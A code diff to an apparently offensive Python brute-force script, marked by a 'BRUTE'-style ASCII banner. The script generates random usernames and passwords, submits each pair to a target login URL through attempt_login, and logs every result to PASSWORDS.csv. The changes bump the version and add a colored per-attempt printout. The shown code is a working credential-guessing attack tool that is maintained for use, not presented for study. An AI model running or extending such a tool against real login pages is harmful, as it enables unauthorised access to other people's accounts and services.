@@ -66,7 +66,7 @@ BBBBBBBBBBBBBBBBB   RRRRRRRR     RRRRRRR      UUUUUUUUU            TTTTTTTTTTT  
 ''' + "\033[0m")
 
 # Print version in blue
-print("\033[94mVersion 1.0\033[0m")
+print("\033[94mVersion 2.1\033[0m")
 
 # Print greeting and quote in green
 quotes = [
@@ -128,7 +128,7 @@ with open('PASSWORDS.csv', 'w', newline='') as csvfile:
 
     writer.writeheader()
 
-    for _ in range(num_attempts):
+    for attempt_num in range(1, num_attempts + 1):
         username = generate_username()
         if option == 1:
             password = generate_password(password_length)
@@ -136,6 +136,10 @@ with open('PASSWORDS.csv', 'w', newline='') as csvfile:
             password_length = random.randint(min_length, max_length)
             password = generate_password(password_length)
         result = attempt_login(username, password, login_url)
+        
+        # Visual broadcast of the attempt
+        print(f"\033[96mAttempt {attempt_num}: Username - {username}, Password - {password}, Result - {result}\033[0m")
+        
         writer.writerow({'Username': username, 'Password': password, 'Result': result})
 
 print(f"{num_attempts} brute force results written to PASSWORDS.csv.")
